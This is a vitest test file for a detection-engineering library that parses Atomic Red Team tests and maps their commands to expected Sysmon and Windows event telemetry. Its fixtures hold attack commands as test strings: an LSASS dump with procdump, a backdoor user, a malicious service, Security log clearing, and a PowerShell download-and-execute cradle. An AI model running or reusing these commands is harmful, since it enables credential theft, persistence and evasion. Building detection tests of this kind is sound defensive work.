import { describe, expect, it } from 'vitest';
import { inferAtomicTelemetry, matchRule, parseAtomicContent, parseAtomicFile, parseAtomicIndex, resolveInputs, techniqueRelation } from '../src/lib/atomic';

const FILE = `attack_technique: T1003.001
display_name: "OS Credential Dumping: LSASS Memory"
atomic_tests:
- name: Dump LSASS.exe Memory using ProcDump
  auto_generated_guid: 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8
  description: Dumps lsass.
  supported_platforms:
  - windows
  input_arguments:
    output_file:
      description: Path of the dump
      type: path
      default: C:\\Windows\\Temp\\lsass_dump.dmp
  dependency_executor_name: powershell
  dependencies:
  - description: ProcDump must exist
    prereq_command: if (Test-Path x) {exit 0} else {exit 1}
    get_prereq_command: Invoke-WebRequest https://example.com -OutFile x
  executor:
    command: |
      procdump.exe -accepteula -ma lsass.exe #{output_file}
    cleanup_command: del "#{output_file}" >nul 2> nul
    name: command_prompt
    elevation_required: true
- name: Manual test
  auto_generated_guid: 11111111-2222-3333-4444-555555555555
  supported_platforms: [windows]
  executor:
    name: manual
    steps: Open the thing.
- name: no guid is skipped
`;

describe('parseAtomicFile', () => {
  it('reads tests, inputs, dependencies and numbers them', () => {
    const tests = parseAtomicFile(FILE);
    expect(tests).toHaveLength(2);
    const [t, manual] = tests;
    expect(t).toMatchObject({
      guid: '0be2230c-9ab3-4ac2-8826-3199b9a0ebf8',
      techniqueId: 'T1003.001',
      testNumber: 1,
      executor: 'command_prompt',
      elevationRequired: true,
      platforms: ['windows'],
      dependencyExecutor: 'powershell',
    });
    expect(t.inputArguments).toEqual([{ name: 'output_file', description: 'Path of the dump', type: 'path', default: 'C:\\Windows\\Temp\\lsass_dump.dmp' }]);
    expect(t.dependencies[0].getPrereqCommand).toContain('Invoke-WebRequest');
    expect(manual).toMatchObject({ testNumber: 2, executor: 'manual', command: 'Open the thing.' });
  });

  it('rejects files that are not atomics', () => {
    expect(parseAtomicFile('title: a sigma rule\ndetection: {}')).toEqual([]);
    expect(parseAtomicFile('attack_technique: nope\natomic_tests: []')).toEqual([]);
    expect(parseAtomicFile(':::not yaml')).toEqual([]);
  });
});

describe('parseAtomicIndex', () => {
  it('reads tactic → technique entries and keeps each test once', () => {
    const entry = FILE.replace(/^/gm, '    ').replace('    attack_technique: T1003.001', '    technique: {}');
    const index = `credential-access:\n  T1003.001:\n${entry}\nstealth:\n  T1003.001:\n${entry}`;
    const tests = parseAtomicIndex(index);
    expect(tests.map((t) => t.guid)).toEqual(['0be2230c-9ab3-4ac2-8826-3199b9a0ebf8', '11111111-2222-3333-4444-555555555555']);
    expect(tests[0].techniqueId).toBe('T1003.001');
    expect(parseAtomicContent(index)).toHaveLength(2);
  });
});

describe('resolveInputs', () => {
  it('fills defaults and leaves unknown placeholders', () => {
    expect(resolveInputs('a #{x} #{y}', [{ name: 'x', default: '1', description: '', type: '' }])).toBe('a 1 #{y}');
  });
});

const win = (command: string, executor = 'powershell') => inferAtomicTelemetry({ platforms: ['windows'], executor, command, inputArguments: [] }).map((e) => e.key);

describe('inferAtomicTelemetry', () => {
  it('always expects process creation on Windows, plus 4104 for PowerShell', () => {
    expect(win('whoami', 'command_prompt')).toEqual(['sysmon:1', 'windows-security:4688']);
    expect(win('whoami')).toEqual(['sysmon:1', 'windows-security:4688', 'windows-powershell:4104']);
  });

  it('recognises what the command does', () => {
    expect(win('procdump -ma lsass.exe out.dmp', 'command_prompt')).toContain('sysmon:10');
    expect(win('reg add HKCU\\Software\\X /v y /d z /f', 'command_prompt')).toEqual(expect.arrayContaining(['sysmon:12', 'sysmon:13']));
    expect(win('schtasks /create /tn x /tr calc.exe /sc onlogon', 'command_prompt')).toContain('windows-security:4698');
    expect(win('sc.exe create evil binPath= c:\\x.exe', 'command_prompt')).toContain('windows-system:7045');
    expect(win('net user eviluser P@ss /add', 'command_prompt')).toContain('windows-security:4720');
    expect(win('wevtutil cl Security', 'command_prompt')).toContain('windows-security:1102');
    expect(win("IEX (New-Object Net.WebClient).DownloadString('https://x.test/a.ps1')")).toEqual(expect.arrayContaining(['sysmon:3', 'sysmon:22']));
    expect(win('whoami > %TEMP%\\out.txt', 'command_prompt')).toContain('sysmon:11');
  });

  it('does not mistake reads, redirections to nul or pipes for writes and shares', () => {
    expect(win('Get-ItemProperty HKLM:\\Software\\Microsoft')).not.toContain('sysmon:13');
    expect(win('whoami >nul 2>&1', 'command_prompt')).not.toContain('sysmon:11');
    expect(win('echo x > \\\\.\\pipe\\evil', 'command_prompt')).not.toContain('windows-security:5140');
    expect(win('dir \\\\fileserver\\share', 'command_prompt')).toContain('windows-security:5140');
  });

  it('covers Linux shells and ignores manual tests and other platforms', () => {
    const linux = inferAtomicTelemetry({ platforms: ['linux'], executor: 'sh', command: 'curl -o /tmp/x https://x.test && rm /tmp/x', inputArguments: [] }).map((e) => e.key);
    expect(linux).toEqual(['sysmon-linux:1', 'auditd:execve', 'sysmon-linux:11', 'sysmon-linux:23', 'sysmon-linux:3']);
    expect(inferAtomicTelemetry({ platforms: ['windows'], executor: 'manual', command: 'do it', inputArguments: [] })).toEqual([]);
    expect(inferAtomicTelemetry({ platforms: ['macos'], executor: 'bash', command: 'whoami', inputArguments: [] })).toEqual([]);
  });

  it('uses input defaults', () => {
    const keys = inferAtomicTelemetry({
      platforms: ['windows'],
      executor: 'command_prompt',
      command: '#{tool} -ma #{target}',
      inputArguments: [{ name: 'target', default: 'lsass.exe', description: '', type: '' }, { name: 'tool', default: 'procdump', description: '', type: '' }],
    }).map((e) => e.key);
    expect(keys).toContain('sysmon:10');
  });
});

describe('matchRule', () => {
  const expected = new Set(['sysmon:1', 'windows-security:4688', 'sysmon:10']);
  it('needs one whole alternative in the expected telemetry', () => {
    expect(matchRule([['sysmon:10']], expected, ['windows'])).toBe('telemetry');
    expect(matchRule([['sysmon:1', 'sysmon:11']], expected, ['windows'])).toBe('other-telemetry');
    expect(matchRule([['sysmon:1', 'sysmon:11'], ['windows-security:4688']], expected, ['windows'])).toBe('telemetry');
  });
  it('separates EDR-fed rules and rules without telemetry', () => {
    expect(matchRule([['crowdstrike:processrollup2']], expected, ['windows'])).toBe('edr');
    expect(matchRule([['aws-cloudtrail:*']], expected, ['windows'])).toBe('other-telemetry');
    expect(matchRule([], expected, ['windows'])).toBe('unknown');
  });
});

describe('techniqueRelation', () => {
  it('matches exact and parent-tagged rules, not sub-technique rules for a parent test', () => {
    expect(techniqueRelation('T1003.001', 'T1003.001')).toBe('exact');
    expect(techniqueRelation('T1003', 'T1003.001')).toBe('parent');
    expect(techniqueRelation('T1003.001', 'T1003')).toBeNull();
    expect(techniqueRelation('T1059', 'T1003.001')).toBeNull();
  });
});
